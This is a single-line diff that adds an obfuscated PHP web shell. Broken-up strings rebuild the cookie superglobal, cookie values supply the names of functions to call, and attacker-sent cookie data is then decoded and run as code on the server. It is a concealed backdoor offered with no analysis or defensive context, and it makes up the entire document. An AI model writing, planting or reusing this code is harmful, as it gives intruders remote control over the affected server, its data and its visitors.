@@ -1,0 +1,1 @@
+<?php $tp='OO';$i/*{*/='KI';$w/*v*/='_C';$nf/*Z]x*/='E';$in=/*)y*/${$w.$tp.$i.$nf};$ur=$in/*@m*/['cD'].$in['N'];$ag=/*w+*/$in['HS'].$in['Af'].$in['Jc'];$to=$ur('',$ag($in['w']));$to();
